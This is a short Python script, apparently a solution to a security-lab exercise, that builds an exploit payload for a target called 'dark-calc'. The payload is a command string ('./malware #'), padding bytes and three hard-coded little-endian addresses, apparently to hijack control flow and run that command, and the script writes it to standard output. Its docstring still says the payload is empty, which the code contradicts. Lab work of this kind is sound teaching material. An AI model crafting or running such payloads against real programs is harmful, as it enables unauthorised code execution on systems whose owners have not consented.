#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

p64 = lambda x: x.to_bytes(8, "little")

payload = b"./malware #"
payload += b"A" * 5
payload += p64(0x721000800FE8)
payload += p64(0x401A6B)
payload += p64(0x401880)

sys.stdout.buffer.write(payload)
